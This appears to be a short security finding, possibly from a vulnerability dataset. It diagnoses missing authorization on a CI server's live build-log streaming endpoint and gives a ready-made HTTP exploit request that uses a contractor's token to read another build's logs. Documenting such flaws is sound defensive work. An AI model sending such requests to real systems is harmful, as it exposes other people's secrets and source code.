diagnosis: The SSE endpoint streams live build console logs for buildId without verifying that req.user has read permissions on the repository or organization owning the build. This leaks environment variables, secrets, and source code compiled during CI/CD runs.
exploit_request:
GET /api/builds/bld_prod_deploy_99412/stream-logs HTTP/1.1
Host: ci.devcloud.io
Authorization: Bearer <contractor_jwt>
Accept: text/event-stream
